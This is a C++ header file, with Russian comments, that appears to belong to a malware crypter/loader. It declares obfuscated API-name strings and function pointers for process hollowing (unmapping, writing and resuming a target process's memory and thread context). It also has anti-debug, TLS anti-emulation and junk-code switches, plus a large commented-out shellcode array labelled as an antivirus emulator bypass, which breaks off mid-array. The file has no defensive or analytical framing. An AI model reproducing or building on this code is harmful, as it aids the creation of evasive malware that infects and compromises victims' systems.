//Основные объявления
#pragma once
#define _WIN32_WINNT 0x0501
#define _USER_MODE
#define WIN32_LEAN_AND_MEAN 
//---------------------------------------------------------------------------------------------------------------------
//#pragma comment(linker,"/MERGE:.text=.code")
//RtlDecompressFragment

//#pragma comment(linker,"/MERGE:.rdata=BSS")
//#pragma comment(linker,"/MERGE:.rdata=.text")

//#pragma comment(linker,"/MERGE:.rdata=.code")
//#pragma comment(linker,"/MERGE:.data=.text") //Тогда нужно чтоб text была writable!!!
//#pragma comment(linker,"/MERGE:.CRT=.text")

//#pragma comment(linker,"/MERGE:.tls=CODE")
//#pragma comment(linker,"/MERGE:.text=CODE")
//#pragma comment(linker,"/MERGE:.data=DATA")
// Файлы заголовков Windows:
#include <windows.h>
#include <Wtsapi32.h>
#include <math.h>
#include <xmmintrin.h>
#include <Shellapi.h>
#include<GL/gl.h>
#include<GL/glu.h>
#include <IPHLPAPI.H>
#include <wininet.h>
#include <ws2tcpip.h>
#include <ClusApi.h>
#include <string.h>
//#include "NetworkProcess.h"
//---------------------------------------------------------------------------------------------------------------------
//Флаги отладок, логирования и фейков разбавления
//#define IS_LOCKER
//#define PREDBG
//#define ANTIDEBUG
//#define TLS
//#define DBG_OK								//Флаг отладки
//#define DBG_TRASH_CODE		//Вместо отладки - треш код

//#define DBG_FAKE				///Отладочный вывод с треш - строками
//#define DBG_FAKE_FILE			//Фейк с записью в файл
//#define DBG_FILE_LOG			//Логирование в файл при отладке
//---------------------------------------------------------------------------------------------------------------------
//---------------------------------------------------------------------------------------------------------------------
void NTAPI on_tls_callback0(PVOID h, DWORD dwReason, PVOID pv);
//Если будем юзать TLS в крипторе для антиэмуляции
#ifdef TLS
	//No /GL
	struct BLAH_BLAH
	{
		int A,B;
		int* pIndex;
		void(__stdcall **f)(PVOID,DWORD,PVOID);
		int C,D;
	};
	int x[]={1};//,1,1,1};
	void(__stdcall *ft[1])(PVOID,DWORD,PVOID)={&on_tls_callback0};//,&on_tls_callback2,&on_tls_callback3,&on_tls_callback4};
	#pragma data_seg (".tls")//CRT$XLB")
	extern "C"
	{
		/* object name must be _tls_used */
		BLAH_BLAH _tls_used={0,0,x,ft,0,0};
	}
	#pragma data_seg ()
	#pragma comment (linker, "/INCLUDE:__tls_used")
	#pragma comment(linker,"/MERGE:.tls=.text")
#endif


	//int x[]={1,1};//,1,1,1};
	//void(__stdcall *ft[2])(PVOID,DWORD,PVOID)={&on_tls_callback0,&on_tls_callback4};//,&on_tls_callback2,&on_tls_callback3,&on_tls_callback4};
	//#pragma data_seg (".tls")//CRT$XLB")
	//extern "C"
	//{
	//	/* object name must be _tls_used */
	//	BLAH_BLAH _tls_used={0,0,x,ft,0,0};
	//}
	//#pragma data_seg ()
	//#pragma comment (linker, "/INCLUDE:__tls_used")

//***********************************************

	//void NTAPI on_tls_callback1(PVOID h, DWORD dwReason, PVOID pv);
	//#pragma comment (linker, "/INCLUDE:__tls_used")
	//#pragma comment (linker, "/INCLUDE:__xl_b")
	//#pragma data_seg (".CRT$XLB")
	//EXTERN_C PIMAGE_TLS_CALLBACK _xl_b = on_tls_callback1;
	//#pragma data_seg ()

//---------------------------------------------------------------------------------------------------------------------
//Файлы заголовков
#include <stdlib.h>
//#include <intrin.h>
#include <Winspool.h>
#include <stdio.h>
#include <malloc.h>
#include <memory.h>
#include <tchar.h>
#include <mmsystem.h>
#include <ntundoc.h>
#include <Wintrust.h>
#include <PowrProf.h>
#include <Commctrl.h>
#include <Objbase.h>
#include <Wincrypt.h>
#include <Imagehlp.h>
#include <commctrl.h>
#include <shlobj.h>
#include <psapi.h>
#include <crtdbg.h>
#include <eh.h>
#include "UAC.h"

//#pragma intrinsic(_ReturnAddress)

#define __START1  	__asm{_emit 0xA0} __asm{_emit 0xB0}	__asm{_emit 0xC0}	__asm{_emit 0xD0};
#define __END1			__asm{_emit 0xDF} __asm{_emit 0xCF}	__asm{_emit 0xBF}	__asm{_emit 0xAF};
//---------------------------------------------------------------------------------------------------------------------
//Раскоментировать, чтобы исключить импорт из ntdll.dll или msvcrt.dll
#undef RtlZeroMemory
	extern "C" void WINAPI	RtlZeroMemory(	VOID *Destination,	SIZE_T Length	);
#undef RtlMoveMemory
	extern "C" VOID __stdcall RtlMoveMemory(IN VOID UNALIGNED *Destination, IN CONST VOID UNALIGNED *Source, IN SIZE_T Length);
	extern "C" inline
		void * __cdecl memmove(__out_bcount_full_opt(_Size) void *_Dst, __in_bcount_opt(_Size) const void *_Src, __in size_t _Size)
	{
		RtlMoveMemory(_Dst, _Src, _Size);
		return _Dst;
	}

#undef  RtlCopyMemory
#define RtlCopyMemory RtlMoveMemory
#pragma function(memcpy)
#define memcpy memmove
//---------------------------------------------------------------------------------------------------------------------
typedef NTSTATUS  (WINAPI* _RtlDecompressBuffer)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, PULONG);
typedef	PTEB (WINAPI*	_NtCurrentTeb)(void);
typedef ATOM	(WINAPI*	_RegisterClassExW)(CONST WNDCLASSEXW *);
typedef NTSTATUS  (WINAPI* _NtWriteVirtualMemory)(HANDLE,void*,const void*,SIZE_T,SIZE_T*);
typedef BOOL (WINAPI*	_CreateProcessW)(LPCWSTR lpApplicationName,LPWSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCWSTR lpCurrentDirectory,LPSTARTUPINFOW lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation);
typedef NTSTATUS  (WINAPI* _NtGetContextThread)(HANDLE,CONTEXT*);
typedef NTSTATUS  (WINAPI* _NtUnmapViewOfSection)(HANDLE,PVOID);
typedef NTSTATUS  (WINAPI* _NtResumeProcess)(HANDLE);
typedef NTSTATUS  (WINAPI* _NtSetContextThread)(HANDLE,const CONTEXT*);
typedef BOOL	(WINAPI*	_FlushInstructionCache)(HANDLE hProcess,LPCVOID lpBaseAddress,SIZE_T dwSize);
typedef NTSTATUS  (WINAPI* _NtProtectVirtualMemory)(HANDLE,PVOID*,SIZE_T*,ULONG,ULONG*);
typedef NTSTATUS  (WINAPI* _NtAllocateVirtualMemory)(HANDLE,PVOID*,ULONG,SIZE_T*,ULONG,ULONG);
typedef void      (WINAPI* _RtlAcquirePebLock)(void);
typedef ATOM (WINAPI* _RegisterClassExA)(__in CONST WNDCLASSEXA *);
typedef BOOL (WINAPI* _CryptStringToBinaryA)(__in_ecount(cchString) LPCSTR pszString,__in DWORD cchString,__in DWORD dwFlags,__out_bcount_part_opt(*pcbBinary, *pcbBinary) BYTE *pbBinary,	__inout DWORD  *pcbBinary,__out_opt DWORD *pdwSkip,	__out_opt DWORD *pdwFlags);
typedef NTSTATUS (WINAPI* _NtClose)(HANDLE);
typedef DWORD (WINAPI* _RtlComputeCrc32)(DWORD,PBYTE,INT);
typedef BOOL (WINAPI* _GetThreadSelectorEntry)(HANDLE hThread,DWORD dwSelector,LPLDT_ENTRY lpSelectorEntry);
typedef DWORD (WINAPI* _RtlGetLastWin32Error)(void);
_NtGetContextThread pNtGetContextThread = NULL;
_NtClose pNtClose;
_RtlComputeCrc32 pRtlComputeCrc32;
_RtlGetLastWin32Error pRtlGetLastWin32Error;
_NtAllocateVirtualMemory pNtAllocateVirtualMemory;// = (_NtAllocateVirtualMemory) 0x00F4FCFA;
_RtlAcquirePebLock pRtlAcquirePebLock;
_NtProtectVirtualMemory pNtProtectVirtualMemory;// = (_NtProtectVirtualMemory) 0x00F4FCFA;
_NtUnmapViewOfSection pNtUnmapViewOfSection;// = (_NtUnmapViewOfSection) 0x00F4FCFA;
_FlushInstructionCache pFlushInstructionCache;// = (_FlushInstructionCache) 0x00F4FCFA;
_NtCurrentTeb pNtCurrentTeb;
_RtlDecompressBuffer pRtlDecompressBuffer;// = (_RtlDecompressBuffer)0x00F4FCFA;
_NtSetContextThread pNtSetContextThread;
_CryptStringToBinaryA pCryptStringToBinaryA;
//---------------------------------------------------------------------------------------------------------------------
//Все строки будут пошифрованы здесь после морфера
//#pragma data_seg (".UPX")
#pragma data_seg (".data")
	HWND hWnd = NULL;
	wchar_t* wcCmdLine;//[MAX_PATH];
	BYTE bExcept = 0;
	PLDR_DATA_TABLE_ENTRY pld;
	DWORD dwMemType = MEM_COMMIT;
	PLIST_ENTRY lex;
	char* szUser32;
	char* szAdvapi32;
	char* szSysEnter;
	char szcFlushInstructionCache[]= {0xFB,0xFC,0xFE,0xFF,0xAA,0x47,0x6E,0x78,0x77,0x6D,0x4F,0x75,0x7B,0x7D,0x7C,0x80,0x6F,0x81,0x77,0x7E,0x7E,0x54,0x73,0x76,0x7C,0x7A,0,0x7,'m','O','r','x','x','x','x','x','x',0};
	HMODULE dwKrnlBase=NULL;
	char szcNtResumeProcess[]= {0xFB,0xFC,0xFE,0xFF,0xAA,0x4F,0x76,0x55,0x69,0x78,0x7B,0x74,0x6D,0x59,0x7C,0x7A,0x6F,0x72,0x81,0x82,0,0x7,'m','O','r','x','x','x','x',0};//{'Z','w','R','e','s','u','m',0,0,0,0,0,0,0,0,0,0};//NtResumeProcess
	HMODULE dwExeBase = NULL;
	HMODULE dwNtBase=NULL;
	char* szCrypt32;
	char szcNtAllocateVirtualMemory[]={0xFB,0xFC,0xFE,0xFF,0xAA,0x4F,0x76,0x44,0x70,0x71,0x75,0x6A,0x69,0x7D,0x6F,0x61,0x75,0x7F,0x82,0x84,0x71,0x7D,0x5F,0x78,0x81,0x84,0x88,0x90,0,0x7,'m','O','r','x','x','x','x','x','x','x','x','x','x','x','x','x',0};
	DWORD dwFullSz;
	char szcZwSetContextThread[] = {0xFB,0xFC,0xFE,0xFF,0xAA,0x5B,0x79,0x56,0x69,0x79,0x49,0x76,0x76,0x7D,0x6F,0x83,0x80,0x61,0x76,0x81,0x75,0x72,0x76,0,0x7,'m','O','r','x','x','x','x','x',0};//{'N','t','S','e','t','C','o','n','t','e','x',0,0,0,0,0,0,0,0,0};//ZwSetContextThread
	LPBYTE lpOutBuff;
	DWORD dwUnco = 0;
	char szcZwAllocateVirtualMemory[]={0xFB,0xFC,0xFE,0xFF,0xAA,0x5B,0x79,0x44,0x70,0x71,0x75,0x6A,0x69,0x7D,0x6F,0x61,0x75,0x7F,0x82,0x84,0x71,0x7D,0x5F,0x78,0x81,0x84,0x88,0x90,0,0x7,'m','O','r','x','x','x','x','x','x','x','x','x','x','x','x','x','x',0};//{0x5B,0x79,0x44,0x70,0x71,0x75,0x6A,0x69,0x7D,0x6F,0x61,0x75,0x7F,0x82,0x84,0x71,0x7D,0x5F,0x78,0x81,0x84,0x88,0x90,0};
	HANDLE hHeap;
	char szcRtlDecompress[]= {0xFB,0xFC,0xFE,0xFF,0xAA,0x53,0x76,0x6F,0x48,0x6A,0x69,0x76,0x75,0x79,0x7C,0x70,0x7F,0x80,0x50,0x84,0x76,0x77,0x77,0x85,0,0x7,'m','O','r','x','x','x','x','x','x','x','x','x','x','x',0};//{'R','t','l','D','e','c','o','m','p','r','e','s','s',0,0,0,0,0,0,0};
	char szcNtUnmapViewOfSection[]={0xFB,0xFC,0xFE,0xFF,0xAA,0x5B,0x79,0x58,0x72,0x72,0x67,0x77,0x5E,0x72,0x6F,0x82,0x5B,0x73,0x61,0x74,0x73,0x85,0x7B,0x82,0x82,0,0x7,'m','O','r','x','x','x','x',0};//{'N','t','U','n','m','a','p','V','i','e','w','O',0,0,0,0,0,0,0,0,0,0};
	DWORD dwRegSz = 0;
	char szcZwGetContextThread[]= {0xFB,0xFC,0xFE,0xFF,0xAA,0x5B,0x79,0x4A,0x69,0x79,0x49,0x76,0x76,0x7D,0x6F,0x83,0x80,0x61,0x76,0x81,0x75,0x72,0x76,0,0x7,'m','O','r','x','x','x','x','x','x',0};
	volatile PVOID lpLockRoutine = NULL;
	char szcZwWriteVirtualMemory[]={0xFB,0xFC,0xFE,0xFF,0xAA,0x5B,0x79,0x5A,0x76,0x6E,0x7A,0x6C,0x5E,0x72,0x7C,0x7F,0x81,0x6E,0x7A,0x5C,0x75,0x7E,0x81,0x85,0x8D,0,0x7,'m','O','r','x','x','x','x','x',0};//{'Z','w','W','r','i','t','e','V','i',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};//ZwWriteVirtualMemory
	LPBYTE lpShell = NULL;
	DWORD dwSzShell;
	char szcCreateProcessW[]={0xFB,0xFC,0xFE,0xFF,0xAA,0x44,0x74,0x68,0x65,0x79,0x6B,0x57,0x7A,0x78,0x6D,0x70,0x7F,0x80,0x65,0,0x7,'m','O','r','x',0};
	char szcSysEnter[]={0xFB,0xFC,0xFE,0xFF,0xAA,0x54,0x7B,0x76,0x49,0x73,0x7A,0x6C,0x7A,0,0x7,'m','O','r','x','x','x','x','x','x','x','x'};
	char szcZwProtectVirtualMemory[]= {0xFB,0xFC,0xFE,0xFF,0xAA,0x5B,0x79,0x53,0x76,0x74,0x7A,0x6C,0x6B,0x7D,0x60,0x74,0x7E,0x81,0x83,0x70,0x7C,0x5E,0x77,0x80,0x83,0x87,0x8F,0,0x7,'m','O','r','x','x','x','x','x',0};
	PPEB pPEB = NULL;
	char szcRtlGetLastWin32Error[]={0xFB,0xFC,0xFE,0xFF,0xAA,0x53,0x76,0x6F,0x4B,0x6A,0x7A,0x53,0x69,0x7C,0x7E,0x62,0x75,0x7B,0x41,0x41,0x55,0x83,0x84,0x82,0x86,0,0x7,'m','O','r','x','x','x','x','x'};
	char szcRtlComputeCrc32[]={0xFB,0xFC,0xFE,0xFF,0xAA,0x53,0x76,0x6F,0x47,0x74,0x73,0x77,0x7D,0x7D,0x6F,0x4E,0x7E,0x70,0x41,0x41,0,0x7,'m','O','r','x','x','x','x'};
	char szcRtlAcquirePebLock[]={0xFB,0xFC,0xFE,0xFF,0xAA,0x53,0x76,0x6F,0x45,0x68,0x77,0x7C,0x71,0x7B,0x6F,0x5B,0x71,0x6F,0x5A,0x7E,0x73,0x7C,0,0x7,'m','O','r','x','x','x',0};
	wchar_t* wsTmp;
	char szcNtClose[]={0xFB,0xFC,0xFE,0xFF,0xAA,0x5B,0x79,0x46,0x70,0x74,0x79,0x6C,0,0x7,'m','O','r','x','x','x','x','x','x'};
	char szccd64[] = {0xFB,0xFC,0xFE,0xFF,0xAA,0x7D,0x26,0x27,0x28,0x82,0x78,0x7A,0x7C,0x7E,0x80,0x82,0x84,0x86,0x88,0x8A,0x34,0x35,0x36,0x37,0x38,0x39,0x3A,0x55,0x57,0x59,0x5B,0x5D,0x5F,0x61,0x63,0x65,0x67,0x69,0x6B,0x6D,0x6F,0x71,0x73,0x75,0x77,0x79,0x7B,0x7D,0x7F,0x81,0x83,0x85,0x87,0x55,0x56,0x57,0x58,0x59,0x5A,0x8F,0x91,0x93,0x95,0x97,0x98,0x9A,0x9C,0x9E,0xA0,0xA2,0xA4,0xA6,0xA8,0xAA,0xAC,0xAE,0xB0,0xB2,0xB4,0xB6,0xB8,0xBA,0xBC,0xBE,0xC0,0xC2,0,0x7,'m','O','r','x','x','x'};//"|$$$}rstuvwxyz{$$$$$$$>?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XYZ[\\]^_`abcdefghijklmnopq";
	char szcCrypt32[] = {0xFB,0xFC,0xFE,0xFF,0xAA,0x64,0x74,0x7C,0x74,0x79,0x39,0x39,0,0x7,'m','O','r','x','x','x','x','x','x','x','x','x'};
	char szcAdvapi32[]={0xFB,0xFC,0xFE,0xFF,0xAA,0x62,0x66,0x79,0x65,0x75,0x6F,0x3A,0x3A,0,0x7,'m','O','r','x','x','x'};
	char szcCryptStringToBinaryA[]={0xFB,0xFC,0xFE,0xFF,0xAA,0x44,0x74,0x7C,0x74,0x79,0x59,0x7B,0x7A,0x72,0x78,0x72,0x60,0x7C,0x50,0x78,0x7E,0x72,0x84,0x8C,0x55,0,0x7,'m','O','r','x','x','x','x','x','x'};
	char szcUser32[] = {0xFB,0xFC,0xFE,0xFF,0xAA,0x76,0x75,0x68,0x76,0x38,0x38,0,0x7,'m','O','r','x','x','x'};
	char szcRegisterClassExA[]={0xFB,0xFC,0xFE,0xFF,0xAA,0x53,0x67,0x6A,0x6D,0x78,0x7A,0x6C,0x7A,0x4C,0x76,0x6C,0x7F,0x80,0x53,0x87,0x51,0,0x7,'m','O','r','x','x','x','x','x','x','x','x','x','x','x'};
//#pragma data_seg ()
//#pragma comment(linker,"/section:.UPX,rw")
#pragma data_seg ()
#pragma comment(linker,"/section:.data,rw")
//------------------------------------------------------------------------------------
//AAVM
//#pragma data_seg (".text")
//	BYTE cVMBYPASS[]= {
//		0x0E9,0x0F1,0x004,0x000,0x000,0x055,0x08B,0x0EC,0x083,0x0C4,
//		0x0F0,0x053,0x056,0x057,0x0C7,0x045,0x0F0,0x010,0x000,0x000,
//		0x000,0x0C7,0x045,0x0F4,0x0F0,0x0F2,0x0F3,0x02E,0x0C7,0x045,
//		0x0F8,0x03E,0x036,0x026,0x064,0x0C7,0x045,0x0FC,0x065,0x066,
//		0x067,0x000,0x08B,0x075,0x008,0x0FC,0x08D,0x055,0x0F4,0x033,
//		0x0DB,0x0FF,0x04D,0x0F0,0x075,0x006,0x033,0x0C0,0x033,0x0C9,
//		0x0EB,0x025,0x0AC,0x08B,0x0FA,0x03C,0x067,0x0B9,0x00B,0x000,
//		0x000,0x000,0x075,0x003,0x080,0x0CB,0x001,0x0F2,0x0AE,0x074,
//		0x0E2,0x04E,0x033,0x0C0,0x00F,0x0B6,0x04E,0x0FF,0x02B,0x075,
//		0x008,0x075,0x004,0x033,0x0C9,0x0EB,0x002,0x08B,0x0C6,0x08B,
//		0x0D3,0x05F,0x05E,0x05B,0x0C9,0x0C2,0x004,0x000,0x055,0x08B,
//		0x0EC,0x053,0x056,0x057,0x08B,0x05D,0x008,0x033,0x0FF,0x00F,
//		0x0B6,0x003,0x08B,0x075,0x00C,0x08B,0x0D0,0x024,0x007,0x0C0,
//		0x0C2,0x002,0x0C7,0x045,0x00C,0x000,0x000,0x000,0x000,0x080,
//		0x0E2,0x003,0x075,0x02B,0x03C,0x003,0x077,0x00B,0x0F7,0x0D8,
//		0x08B,0x084,0x086,0x0B0,0x000,0x000,0x000,0x0EB,0x04F,0x03C,
//		0x004,0x075,0x008,0x0E8,0x092,0x000,0x000,0x000,0x047,0x0EB,
//		0x043,0x03C,0x005,0x075,0x008,0x08B,0x043,0x001,0x083,0x0C7,
//		0x004,0x0EB,0x037,0x02C,0x002,0x0EB,0x0D9,0x080,0x0FA,0x003,
//		0x074,0x053,0x03C,0x003,0x077,0x036,0x0F7,0x0D8,0x08B,0x084,
//		0x086,0x0B0,0x000,0x000,0x000,0x080,0x0FA,0x001,0x075,0x013,
//		0x00F,0x0B6,0x054,0x01F,0x001,0x047,0x00F,0x0BA,0x0F2,0x007,
//		0x073,0x00E,0x02D,0x080,0x000,0x000,0x000,0x0EB,0x007,0x08B,
//		0x054,0x01F,0x001,0x083,0x0C7,0x004,0x003,0x0C2,0x08B,0x0CF,
//		0x08B,0x055,0x00C,0x05F,0x05E,0x05B,0x0C9,0x0C2,0x008,0x000,
//		0x03C,0x004,0x077,0x008,0x0E8,0x037,0x000,0x000,0x000,0x047,
//		0x0EB,0x0C7,0x03C,0x005,0x075,0x005,0x083,0x0E8,0x006,0x0EB,
//		0x0B5,0x02C,0x002,0x0EB,0x0B1,0x0C7,0x045,0x00C,0x001,0x000,
//		0x000,0x000,0x03C,0x003,0x00F,0x086,0x072,0x0FF,0x0FF,0x0FF,
//		0x03C,0x004,0x077,0x008,0x083,0x0E8,0x009,0x0E9,0x066,0x0FF,
//		0x0FF,0x0FF,0x03C,0x005,0x075,0x085,0x083,0x0E8,0x006,0x0E9,
//		0x05A,0x0FF,0x0FF,0x0FF,0x00F,0x0B6,0x04B,0x001,0x08B,0x0C1,
//		0x0C0,0x0C1,0x002,0x0C1,0x0E8,0x003,0x024,0x007,0x080,0x0E1,
//		0x003,0x03C,0x005,0x075,0x005,0x083,0x0E8,0x006,0x0EB,0x010,
//		0x03C,0x004,0x075,0x006,0x033,0x0C0,0x0EB,0x013,0x0EB,0x006,
//		0x03C,0x005,0x076,0x002,0x02C,0x002,0x0F7,0x0D8,0x08B,0x084,
//		0x086,0x0B0,0x000,0x000,0x000,0x0D3,0x0E0,0x00F,0x0B6,0x04B,
//		0x001,0x080,0x0E1,0x007,0x080,0x0F9,0x004,0x075,0x008,0x003,
//		0x086,0x0C4,0x000,0x000,0x000,0x0EB,0x02E,0x080,0x0F9,0x005,
//		0x075,0x014,0x00A,0x0D2,0x075,0x008,0x003,0x043,0x002,0x083,
//		0x0C7,0x004,0x0EB,0x01D,0x003,0x086,0x0B4,0x000,0x000,0x000,
//		0x0EB,0x015,0x080,0x0F9,0x003,0x077,0x00B,0x0F7,0x0D9,0x003,
//		0x084,0x08E,0x0B0,0x000,0x000,0x000,0x0EB,0x005,0x080,0x0E9,
//		0x002,0x0EB,0x0F0,0x0C3,0x055,0x08B,0x0EC,0x083,0x065,0x008,
//		0x00F,0x08B,0x045,0x008,0x08B,0x04D,0x00C,0x083,0x065,0x008,
//		0x001,0x0E8,0x00A,0x000,0x000,0x000,0x00F,0x092,0x0C0,0x031,
//		0x045,0x008,0x0C9,0x0C2,0x008,0x000,0x0D1,0x0E8,0x083,0x0E0,
//		0x007,0x074,0x038,0x0FE,0x0C8,0x074,0x039,0x0FE,0x0C8,0x074,
//		0x03A,0x0FE,0x0C8,0x074,0x045,0x0FE,0x0C8,0x074,0x037,0x0FE,
//		0x0C8,0x074,0x038,0x0FE,0x0C8,0x074,0x009,0x0FE,0x0C8,0x00F,
//		0x0BA,0x0E1,0x006,0x073,0x001,0x0C3,0x0F7,0x0C1,0x080,0x000,
//		0x000,0x000,0x00F,0x0BA,0x0E1,0x00B,0x075,0x004,0x072,0x007,
//		0x0EB,0x002,0x073,0x003,0x033,0x0C0,0x0C3,0x0F9,0x0C3,0x00F,
//		0x0BA,0x0E1,0x00B,0x0C3,0x00F,0x0BA,0x0E1,0x000,0x0C3,0x00F,
//		0x0BA,0x0E1,0x006,0x0C3,0x00F,0x0BA,0x0E1,0x007,0x0C3,0x00F,
//		0x0BA,0x0E1,0x002,0x0C3,0x0F7,0x0C1,0x041,0x000,0x000,0x000,
//		0x075,0x0DD,0x0C3,0x055,0x08B,0x0EC,0x053,0x056,0x08B,0x05D,
//		0x008,0x08B,0x075,0x00C,0x00F,0x0B6,0x003,0x03C,0x00F,0x074,
//		0x03E,0x03C,0x070,0x00F,0x082,0x0B1,0x000,0x000,0x000,0x03C,
//		0x07F,0x077,0x05A,0x0FF,0x0B6,0x0C0,0x000,0x000,0x000,0x050,
//		0x0E8,0x055,0x0FF,0x0FF,0x0FF,0x00F,0x0B6,0x043,0x001,0x075,
//		0x005,0x083,0x0C3,0x002,0x0EB,0x019,0x00F,0x0BA,0x0F0,0x007,
//		0x073,0x005,0x02D,0x080,0x000,0x000,0x000,0x08D,0x05C,0x003,
//		0x002,0x00B,0x0D2,0x074,0x006,0x081,0x0E3,0x0FF,0x0FF,0x000,
//		0x000,0x0EB,0x073,0x00F,0x0B6,0x043,0x001,0x03C,0x080,0x072,
//		0x073,0x03C,0x08F,0x077,0x06F,0x0FF,0x0B6,0x0C0,0x000,0x000,
//		0x000,0x050,0x0E8,0x017,0x0FF,0x0FF,0x0FF,0x075,0x005,0x083,
//		0x0C3,0x006,0x0EB,0x007,0x08B,0x043,0x002,0x08D,0x05C,0x003,
//		0x006,0x0EB,0x04B,0x02C,0x0E0,0x08B,0x08E,0x0AC,0x000,0x000,
//		0x000,0x072,0x049,0x03C,0x003,0x077,0x045,0x075,0x006,0x085,
//		0x0C9,0x074,0x092,0x0EB,0x032,0x00B,0x0C9,0x074,0x02E,0x048,
//		0x075,0x010,0x00F,0x0BA,0x0A6,0x0C0,0x000,0x000,0x000,0x006,
//		0x00F,0x083,0x07B,0x0FF,0x0FF,0x0FF,0x0EB,0x01B,0x048,0x075,
//		0x010,0x00F,0x0BA,0x0A6,0x0C0,0x000,0x000,0x000,0x006,0x00F,
//		0x082,0x068,0x0FF,0x0FF,0x0FF,0x0EB,0x008,0x085,0x0C9,0x00F,
//		0x085,0x05E,0x0FF,0x0FF,0x0FF,0x083,0x0C3,0x002,0x08B,0x0C3,
//		0x05E,0x05B,0x0C9,0x0C2,0x008,0x000,0x033,0x0C0,0x0EB,0x0F6,
//		0x055,0x08B,0x0EC,0x053,0x08B,0x05D,0x008,0x00F,0x0B6,0x003,
//		0x03C,0x0EB,0x075,0x015,0x00F,0x0B6,0x043,0x001,0x00F,0x0BA,
//		0x0F0,0x007,0x073,0x005,0x02D,0x080,0x000,0x000,0x000,0x08D,
//		0x044,0x003,0x002,0x0EB,0x036,0x03C,0x0E9,0x075,0x009,0x08B,
//		0x043,0x001,0x08D,0x044,0x003,0x005,0x0EB,0x029,0x03C,0x0FF,
//		0x075,0x023,0x00F,0x0B6,0x043,0x001,0x024,0x038,0x0C0,0x0E8,
//		0x003,0x03C,0x004,0x075,0x016,0x043,0x0FF,0x075,0x00C,0x053,
//		0x0E8,0x01F,0x0FD,0x0FF,0x0FF,0x00B,0x0C0,0x074,0x00A,0x00B,
//		0x0D2,0x075,0x002,0x08B,0x000,0x0EB,0x002,0x033,0x0C0,0x05B,
//		0x0C9,0x0C2,0x008,0x000,0x055,0x08B,0x0EC,0x053,0x08B,0x05D,
//		0x008,0x00F,0x0B6,0x00B,0x080,0x0F9,0x0E8,0x075,0x00C,0x08D,
//		0x048,0x005,0x08B,0x053,0x001,0x08D,0x044,0x013,0x005,0x0EB,
//		0x032,0x080,0x0F9,0x0FF,0x075,0x02B,0x00F,0x0B6,0x04B,0x001,
//		0x080,0x0E1,0x038,0x0C0,0x0E9,0x003,0x080,0x0F9,0x002,0x075,
//		0x01C,0x050,0x043,0x0FF,0x075,0x00C,0x053,0x0E8,0x0D2,0x0FC,
//		0x0FF,0x0FF,0x00B,0x0C0,0x074,0x006,0x00B,0x0D2,0x075,0x002,
//		0x08B,0x000,0x05A,0x08D,0x04C,0x00A,0x002,0x0EB,0x002,0x033,
//		0x0C0,0x05B,0x0C9,0x0C2,0x008,0x000,0x055,0x08B,0x0EC,0x08B,
//		0x055,0x008,0x00F,0x0B6,0x00C,0x010,0x08B,0x045,0x00C,0x080,
//		0x0F9,0x0C3,0x074,0x005,0x080,0x0F9,0x0C2,0x075,0x00A,0x08B,
//		0x080,0x0C4,0x000,0x000,0x000,0x08B,0x000,0x0EB,0x002,0x033,
//		0x0C0,0x0C9,0x0C2,0x008,0x000,0x058,0x0C3,0x0E8,0x0F9,0x0FF,
//		0x0FF,0x0FF,0x0FF,0x073,0x014,0x068,0x002,0x001,0x000,0x000,
//		0x08B,0x05B,0x010,0x09D,0x0C3,0x0E8,0x0E7,0x0FF,0x0FF,0x0FF,
//		0x055,0x08B,0x0EC,0x053,0x056,0x057,0x08B,0x075,0x008,0x08B,
//		0x07D,0x010,0x08B,0x05E,0x00C,0x083,0x07E,0x004,0x000,0x075,
//		0x008,0x081,0x03E,0x004,0x000,0x000,0x080,0x074,0x00A,0x0B8,
//		0x001,0x000,0x000,0x000,0x0E9,0x0D6,0x000,0x000,0x000,0x08B,
//		0x075,0x00C,0x039,0x05E,0x008,0x074,0x00C,0x081,0x08F,0x0C0,
//		0x000,0x000,0x000,0x000,0x001,0x000,0x000,0x0EB,0x016,0x0C7,
//		0x046,0x01C,0x0C2,0x000,0x000,0x000,0x081,0x0A7,0x0C0,0x000,
//		0x000,0x000,0x0FF,0x0FE,0x0FF,0x0FF,0x0E9,0x0AA,0x000,0x000,
//		0x000,0x08B,0x046,0x014,0x00B,0x0C0,0x074,0x017,0x083,0x07E,
//		0x01C,0x000,0x075,0x006,0x03B,0x0D8,0x075,0x0E0,0x0EB,0x00B,
//		0x03B,0x0D8,0x072,0x0DA,0x083,0x0C0,0x00F,0x03B,0x0D8,0x073,
//		0x0D3,0x0FF,0x046,0x018,0x0C7,0x046,0x01C,0x000,0x000,0x000,
//		0x000,0x053,0x0E8,0x094,0x0FB,0x0FF,0x0FF,0x003,0x0D8,0x057,
//		0x053,0x0E8,0x088,0x0FE,0x0FF,0x0FF,0x00B,0x0C0,0x075,0x06C,
//		0x057,0x053,0x0E8,0x0AE,0x0FD,0x0FF,0x0FF,0x00B,0x0C0,0x075,
//		0x061,0x057,0x053,0x0E8,0x0D0,0x0FE,0x0FF,0x0FF,0x00B,0x0C0,
//		0x075,0x056,0x057,0x053,0x0E8,0x017,0x0FF,0x0FF,0x0FF,0x00B,
//		0x0C0,0x075,0x04B,0x080,0x03B,0x00F,0x075,0x006,0x080,0x07B,
//		0x001,0x034,0x074,0x00B,0x080,0x03B,0x0CD,0x075,0x02E,0x080,
//		0x07B,0x001,0x02E,0x075,0x028,0x0E8,0x021,0x0FF,0x0FF,0x0FF,
//		0x08B,0x08F,0x0C4,0x000,0x000,0x000,0x08B,0x097,0x0A4,0x000,
//		0x000,0x000,0x081,0x0A7,0x0C0,0x000,0x000,0x000,0x0FF,0x0FE,
//		0x0FF,0x0FF,0x087,0x001,0x089,0x056,0x010,0x089,0x0B7,0x0A4,
//		0x000,0x000,0x000,0x0EB,0x00D,0x08B,0x04D,0x008,0x0C7,0x046,
//		0x01C,0x001,0x000,0x000,0x000,0x08B,0x041,0x00C,0x089,0x046,
//		0x014,0x033,0x0C0,0x05F,0x05E,0x05B,0x0C9,0x0C2,0x010,0x000,
//		0x055,0x08B,0x0EC,0x033,0x0C0,0x08B,0x04D,0x010,0x050,0x050,
//		0x050,0x050,0x0E8,0x02B,0x000,0x000,0x000,0x055,0x050,0x0E8,
